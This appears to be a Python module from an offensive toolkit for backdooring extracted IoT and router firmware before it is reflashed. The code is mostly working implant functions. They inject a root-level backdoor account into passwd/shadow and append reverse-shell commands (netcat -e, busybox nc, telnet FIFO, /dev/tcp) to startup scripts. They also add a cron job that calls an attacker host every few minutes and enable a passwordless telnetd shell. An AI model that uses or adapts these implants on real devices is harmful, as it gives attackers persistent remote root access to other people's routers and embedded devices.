"""
embedxpl/modules/post/iot_implant_toolkit.py

IoT Implant Toolkit: firmware backdoor injection for embedded devices.

Provides functions for injecting persistence mechanisms into extracted
IoT/router firmware images. Supports:
  - Reverse shell injection into rcS/inittab startup scripts
  - Backdoor account injection into passwd/shadow
  - Cron-based callback persistence
  - Busybox telnetd/dropbear enablement
  - LD_PRELOAD shared library injection (for MIPS/ARM/x86 firmware)

Designed for use after firmware extraction (via binwalk/jefferson/ubi_reader)
and before repacking. The modified image is then flashed back to the target
device during authorized penetration tests.

Based on techniques from IoT-Implant-Toolkit, firmware-mod-kit, and
embedded device red team research.

WARNING: Only use against devices you own or have written authorization to test.

Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
Version: 1.0.0
"""
from __future__ import annotations

import hashlib
import os
import re
import shutil
import stat
from pathlib import Path
from typing import Optional

__version__ = "1.0.0"

_BUSYBOX_PATHS = [
    "bin/busybox",
    "usr/bin/busybox",
    "sbin/busybox",
]

_STARTUP_SCRIPTS = [
    "etc/init.d/rcS",
    "etc/rc.d/rcS",
    "etc/inittab",
    "etc/init.d/S99local",
    "etc/rc.local",
]

_CRON_PATHS = [
    "var/spool/cron/crontabs/root",
    "etc/crontabs/root",
    "var/spool/cron/root",
]


def find_rootfs(firmware_dir: str) -> Optional[Path]:
    """Locate the root filesystem directory in an extracted firmware.

    Walks the extraction directory looking for standard Linux rootfs markers
    (etc/passwd, bin/busybox, etc).

    Args:
        firmware_dir: path to the extracted firmware directory.

    Returns:
        Path to the rootfs directory, or None.
    """
    base = Path(firmware_dir)
    for root, dirs, files in os.walk(str(base)):
        root_path = Path(root)
        if (root_path / "etc" / "passwd").exists() and (
            (root_path / "bin").exists() or (root_path / "sbin").exists()
        ):
            return root_path
    return None


def inject_backdoor_account(
    rootfs: str,
    username: str = "support",
    password_hash: str = "$1$embed$XPLSuiteBackdoor",
    uid: int = 0,
    gid: int = 0,
    shell: str = "/bin/sh",
) -> bool:
    """Inject a backdoor user account into /etc/passwd and /etc/shadow.

    The account defaults to UID 0 (root equivalent). The password hash
    should be generated with: openssl passwd -1 -salt embed <password>

    Args:
        rootfs: path to the extracted rootfs directory.
        username: account username.
        password_hash: crypt(3) password hash.
        uid: numeric user ID.
        gid: numeric group ID.
        shell: login shell path.

    Returns:
        True if injection succeeded.
    """
    rootfs_path = Path(rootfs)
    passwd_file = rootfs_path / "etc" / "passwd"
    shadow_file = rootfs_path / "etc" / "shadow"

    if not passwd_file.exists():
        return False

    passwd_content = passwd_file.read_text(errors="replace")
    if f"{username}:" in passwd_content:
        return True

    passwd_entry = f"{username}:x:{uid}:{gid}::/root:{shell}\n"
    with open(passwd_file, "a") as f:
        f.write(passwd_entry)

    if shadow_file.exists():
        shadow_entry = f"{username}:{password_hash}:18000:0:99999:7:::\n"
        with open(shadow_file, "a") as f:
            f.write(shadow_entry)

    return True


def inject_reverse_shell(
    rootfs: str,
    callback_host: str,
    callback_port: int = 4444,
    method: str = "netcat",
) -> bool:
    """Inject a reverse shell into the firmware's startup scripts.

    Adds a background reverse shell command to rcS or equivalent init script.

    Args:
        rootfs: path to the extracted rootfs directory.
        callback_host: attacker IP/hostname.
        callback_port: callback port.
        method: "netcat", "telnet", "bash", or "busybox".

    Returns:
        True if injection succeeded.
    """
    rootfs_path = Path(rootfs)

    shell_commands = {
        "netcat": f"nc {callback_host} {callback_port} -e /bin/sh &",
        "busybox": f"busybox nc {callback_host} {callback_port} -e /bin/sh &",
        "telnet": (
            f"mkfifo /tmp/.xpl; "
            f"telnet {callback_host} {callback_port} < /tmp/.xpl | "
            f"/bin/sh > /tmp/.xpl 2>&1 &"
        ),
        "bash": (
            f"/bin/sh -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1 &"
        ),
    }

    cmd = shell_commands.get(method, shell_commands["busybox"])
    marker = "# XPL-implant"
    payload = f"\n{marker}\n{cmd}\n"

    for script_rel in _STARTUP_SCRIPTS:
        script_path = rootfs_path / script_rel
        if script_path.exists():
            content = script_path.read_text(errors="replace")
            if marker in content:
                return True
            with open(script_path, "a") as f:
                f.write(payload)
            script_path.chmod(script_path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP)
            return True

    # No startup script found; create one
    rcs_path = rootfs_path / "etc" / "init.d" / "rcS"
    rcs_path.parent.mkdir(parents=True, exist_ok=True)
    rcs_path.write_text(f"#!/bin/sh\n{payload}")
    rcs_path.chmod(0o755)
    return True


def inject_cron_callback(
    rootfs: str,
    callback_host: str,
    callback_port: int = 4444,
    interval_minutes: int = 5,
) -> bool:
    """Inject a cron-based reverse shell for periodic callbacks.

    Args:
        rootfs: path to the extracted rootfs directory.
        callback_host: attacker IP/hostname.
        callback_port: callback port.
        interval_minutes: callback interval in minutes.

    Returns:
        True if injection succeeded.
    """
    rootfs_path = Path(rootfs)
    cron_line = (
        f"*/{interval_minutes} * * * * "
        f"busybox nc {callback_host} {callback_port} -e /bin/sh\n"
    )

    for cron_rel in _CRON_PATHS:
        cron_path = rootfs_path / cron_rel
        if cron_path.parent.exists():
            content = ""
            if cron_path.exists():
                content = cron_path.read_text(errors="replace")
            if callback_host in content:
                return True
            with open(cron_path, "a") as f:
                f.write(cron_line)
            return True

    # Create crontab directory
    cron_path = rootfs_path / "var" / "spool" / "cron" / "crontabs" / "root"
    cron_path.parent.mkdir(parents=True, exist_ok=True)
    cron_path.write_text(cron_line)
    return True


def enable_telnetd(
    rootfs: str,
    port: int = 23,
    login_shell: str = "/bin/sh",
) -> bool:
    """Enable telnetd on the firmware startup.

    Uses busybox telnetd if available (common on embedded Linux).

    Args:
        rootfs: path to the extracted rootfs directory.
        port: telnet port.
        login_shell: shell to spawn on connection.

    Returns:
        True if injection succeeded.
    """
    rootfs_path = Path(rootfs)

    busybox_found = any(
        (rootfs_path / bp).exists() for bp in _BUSYBOX_PATHS
    )

    if busybox_found:
        cmd = f"busybox telnetd -p {port} -l {login_shell} &"
    else:
        cmd = f"telnetd -p {port} -l {login_shell} &"

    marker = "# XPL-telnetd"
    payload = f"\n{marker}\n{cmd}\n"

    for script_rel in _STARTUP_SCRIPTS:
        script_path = rootfs_path / script_rel
        if script_path.exists():
            content = script_path.read_text(errors="replace")
            if marker in content:
                return True
            with open(script_path, "a") as f:
                f.write(payload)
            return True

    return False


def compute_firmware_hash(firmware_path: str) -> dict[str, str]:
    """Compute MD5 and SHA256 hashes of a firmware file.

    Useful for tracking modifications.

    Returns:
        Dict with md5 and sha256 keys.
    """
    md5 = hashlib.md5()
    sha256 = hashlib.sha256()
    with open(firmware_path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            md5.update(chunk)
            sha256.update(chunk)
    return {"md5": md5.hexdigest(), "sha256": sha256.hexdigest()}


def list_firmware_services(rootfs: str) -> list[dict[str, str]]:
    """List services configured in the firmware's init system.

    Scans rcS, inittab, and init.d scripts for service entries.

    Returns:
        List of dicts with keys: service, script, type.
    """
    rootfs_path = Path(rootfs)
    services: list[dict[str, str]] = []

    # Check init.d scripts
    initd = rootfs_path / "etc" / "init.d"
    if initd.exists():
        for script in sorted(initd.iterdir()):
            if script.is_file() and script.name not in ("rcS", ".", ".."):
                services.append({
                    "service": script.name,
                    "script": str(script.relative_to(rootfs_path)),
                    "type": "init.d",
                })

    # Check inittab
    inittab = rootfs_path / "etc" / "inittab"
    if inittab.exists():
        for line in inittab.read_text(errors="replace").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                parts = line.split(":")
                if len(parts) >= 4:
                    services.append({
                        "service": parts[3].split()[0] if parts[3].strip() else parts[0],
                        "script": "etc/inittab",
                        "type": "inittab",
                    })

    return services
